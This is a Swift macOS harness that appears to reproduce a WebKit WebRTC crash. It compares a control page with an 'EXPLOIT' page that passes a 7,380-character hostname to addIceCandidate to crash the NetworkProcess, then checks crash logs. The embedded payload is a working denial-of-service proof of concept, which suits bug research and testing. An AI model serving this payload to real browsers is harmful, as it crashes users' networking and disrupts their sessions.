import AppKit
import WebKit

// Phase B — WebRTC overlong hostname crash
// Signal: 4a2069dce8
// Path: addIceCandidate → CreateUDPSocket → nw_endpoint_create_host_with_numeric_port(>1023) → NULL → TRAP

// Control HTML: valid short hostname → Promise resolves, no crash
let CONTROL_HTML = """
<!DOCTYPE html><html><body>
<div id="result">PENDING</div>
<script>
async function run() {
    try {
        const pc = new RTCPeerConnection({iceServers:[]});
        const offer = await pc.createOffer({offerToReceiveAudio:true});
        await pc.setLocalDescription(offer);
        // Valid short hostname
        await pc.addIceCandidate({
            candidate: "candidate:1 1 UDP 1 valid.example.com 9999 typ host",
            sdpMid: "0"
        });
        document.getElementById('result').textContent = 'CONTROL_PASS';
        window.webkit.messageHandlers.result.postMessage('CONTROL_PASS');
    } catch(e) {
        document.getElementById('result').textContent = 'CONTROL_ERROR:' + e;
        window.webkit.messageHandlers.result.postMessage('CONTROL_ERROR:' + e);
    }
}
window.addEventListener('load', run);
</script></body></html>
"""

// Exploit HTML: overlong hostname (7380 chars) → NetworkProcess crash
let EXPLOIT_HTML = """
<!DOCTYPE html><html><body>
<div id="result">PENDING</div>
<script>
async function run() {
    try {
        const pc = new RTCPeerConnection({iceServers:[]});
        const offer = await pc.createOffer({offerToReceiveAudio:true});
        await pc.setLocalDescription(offer);
        const longHostname = 'A'.repeat(7380);
        // addIceCandidate with overlong hostname
        // → NetworkRTCProvider::createUDPSocket
        // → nw_endpoint_create_host_with_numeric_port(7380 chars) → NULL
        // → nw_endpoint_get_hostname(NULL) → NULL
        // → std::string_view(nullptr) → libc++ TRAP → NetworkProcess crash
        const result = await pc.addIceCandidate({
            candidate: 'candidate:1 1 UDP 1 ' + longHostname + ' 9999 typ host',
            sdpMid: "0"
        }).then(() => 'RESOLVED')
          .catch(e => 'REJECTED:' + e);
        document.getElementById('result').textContent = result;
        window.webkit.messageHandlers.result.postMessage(result);
    } catch(e) {
        document.getElementById('result').textContent = 'ERROR:' + e;
        window.webkit.messageHandlers.result.postMessage('ERROR:' + e);
    }
}
window.addEventListener('load', run);
</script></body></html>
"""

class PhaseB: NSObject, NSApplicationDelegate, WKNavigationDelegate, WKScriptMessageHandler {
    var windows: [NSWindow] = []
    var webViews: [WKWebView] = []
    var phase = "control"

    func applicationDidFinishLaunching(_ n: Notification) {
        print("=== Phase B: WebRTC overlong hostname crash ===")
        print("Signal: 4a2069dce8")
        print("macOS: \(ProcessInfo.processInfo.operatingSystemVersionString)")
        print("WebKit: \(WKWebView.self)")
        print("")
        runControl()
    }

    func makeWebView() -> WKWebView {
        let config = WKWebViewConfiguration()
        config.userContentController.add(self, name: "result")
        // Enable WebRTC
        config.preferences.setValue(true, forKey: "peerConnectionEnabled")
        let wv = WKWebView(frame: NSRect(x: 0, y: 0, width: 800, height: 600), configuration: config)
        wv.navigationDelegate = self
        let win = NSWindow(contentRect: NSRect(x: 0, y: 0, width: 800, height: 600),
                          styleMask: [.titled], backing: .buffered, defer: false)
        win.contentView = wv
        windows.append(win)
        webViews.append(wv)
        return wv
    }

    func runControl() {
        phase = "control"
        print("--- CONTROL: short hostname (expect: CONTROL_PASS, no crash) ---")
        let wv = makeWebView()
        wv.loadHTMLString(CONTROL_HTML, baseURL: URL(string: "https://localhost")!)

        DispatchQueue.main.asyncAfter(deadline: .now() + 15) {
            if self.phase == "control" {
                print("CONTROL: timeout (no message received)")
                self.runExploit()
            }
        }
    }

    func runExploit() {
        phase = "exploit"
        print("")
        print("--- EXPLOIT: hostname 'A'x7380 (expect: NetworkProcess crash) ---")
        let wv = makeWebView()
        wv.loadHTMLString(EXPLOIT_HTML, baseURL: URL(string: "https://localhost")!)

        DispatchQueue.main.asyncAfter(deadline: .now() + 15) {
            if self.phase == "exploit" {
                print("EXPLOIT: timeout — no crash, no Promise resolution in 15s")
                self.checkCrashLogs()
                self.checkNavigationAlive()
            }
        }
    }

    func checkCrashLogs() {
        print("")
        print("--- Crash logs ---")
        let crashDir = NSString(string: "~/Library/Logs/DiagnosticReports").expandingTildeInPath
        let fm = FileManager.default
        if let files = try? fm.contentsOfDirectory(atPath: crashDir) {
            let crashes = files.filter { $0.hasSuffix(".crash") || $0.hasSuffix(".ips") }
            if crashes.isEmpty {
                print("No crash logs found")
            } else {
                for f in crashes.prefix(3) {
                    print("CRASH LOG: \(f)")
                    if let content = try? String(contentsOfFile: "\(crashDir)/\(f)") {
                        print(content.prefix(500))
                    }
                }
            }
        }
    }

    func checkNavigationAlive() {
        print("")
        print("--- Post-exploit navigation check ---")
        let wv = makeWebView()
        wv.loadHTMLString("<html><body>ALIVE</body></html>", baseURL: nil)
        DispatchQueue.main.asyncAfter(deadline: .now() + 8) {
            wv.evaluateJavaScript("document.body.innerText") { r, e in
                if let text = r as? String {
                    print("Navigation after exploit: \(text)")
                } else {
                    print("Navigation after exploit: FAILED (\(String(describing: e)))")
                }
                print("")
                print("=== Phase B complete ===")
                exit(0)
            }
        }
    }

    func userContentController(_ c: WKUserContentController, didReceive msg: WKScriptMessage) {
        let result = msg.body as? String ?? "unknown"
        print("Promise result: \(result)")

        if phase == "control" {
            if result == "CONTROL_PASS" {
                print("CONTROL: PASS — short hostname accepted, no crash")
            } else {
                print("CONTROL: \(result)")
            }
            runExploit()
        } else if phase == "exploit" {
            print("EXPLOIT Promise resolved: \(result)")
            print("No NetworkProcess crash observed for this call")
            checkCrashLogs()
            checkNavigationAlive()
        }
    }

    func webView(_ wv: WKWebView, didFail n: WKNavigation!, withError e: Error) {
        print("nav error: \(e.localizedDescription)")
    }
    func webView(_ wv: WKWebView, didFailProvisionalNavigation n: WKNavigation!, withError e: Error) {
        print("provisional nav error: \(e.localizedDescription)")
    }
}

let app = NSApplication.shared
let d = PhaseB()
app.delegate = d
app.run()
